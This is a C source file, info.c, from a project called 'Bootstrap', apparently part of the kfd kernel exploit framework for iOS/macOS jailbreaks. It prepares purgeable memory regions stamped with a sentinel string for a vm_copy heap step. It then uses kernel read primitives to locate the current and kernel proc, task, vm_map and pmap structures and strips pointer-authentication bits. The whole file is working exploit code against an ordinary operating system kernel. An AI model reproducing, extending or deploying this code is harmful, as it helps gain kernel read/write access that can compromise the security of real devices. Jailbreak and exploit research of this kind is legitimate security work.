//
//  info.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "info.h"
#include "../include/include.h"

const char info_copy_sentinel[16] = "p0up0u was here";
const uint64_t info_copy_sentinel_size = sizeof(info_copy_sentinel);

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the kfd->info.copy substructure.
     *
     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The size of the copy must be strictly greater than msg_ool_size_small.
     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    const vm_size_t msg_ool_size_small = (32 * 1024);
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (uint64_t offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }

    /*
     * Initialize the kfd->info.env substructure.
     */
    kfd->info.env.pid = getpid();
    print_i32(kfd->info.env.pid);
    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    print_u64(kfd->info.env.tid);

    uintptr_t size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    print_u64(kfd->info.env.maxfilesperproc);

    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));

    char kern_version[512] = {};
    uintptr_t size2 = sizeof(kern_version);
    assert_bsd(sysctlbyname("kern.version", &kern_version, &size2, NULL, 0));
    print_string(kern_version);
    
/*
    const uint64_t number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
    for (uint64_t i = 0; i < number_of_kern_versions; i++) {
        const char* current_kern_version = kern_versions[i].kern_version;
        if (!memcmp(kern_version, current_kern_version, strlen(current_kern_version))) {
            kfd->info.env.vid = i;
            print_u64(kfd->info.env.vid);
            return;
        }
    }
    */
    
}

void info_run(struct kfd* kfd)
{
    timer_start();

    /*
     * current_task()
     */
    assert(kfd->info.kaddr.current_proc);
    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
    print_x64(kfd->info.kaddr.current_proc);
    print_x64(kfd->info.kaddr.current_task);

    /*
     * current_map()
     */
    uint64_t signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
    print_x64(kfd->info.kaddr.current_map);

    /*
     * current_pmap()
     */
    uint64_t signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
    print_x64(kfd->info.kaddr.current_pmap);

    if (kfd->info.kaddr.kernel_proc) {
        /*
         * kernel_task()
         */
        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
        print_x64(kfd->info.kaddr.kernel_proc);
        print_x64(kfd->info.kaddr.kernel_task);

        /*
         * kernel_map()
         */
        uint64_t signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = UNSIGN_PTR(signed_map_kaddr);
        print_x64(kfd->info.kaddr.kernel_map);

        /*
         * kernel_pmap()
         */
        uint64_t signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
        print_x64(kfd->info.kaddr.kernel_pmap);
    }

    timer_end();
}

void info_free(struct kfd* kfd)
{
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}
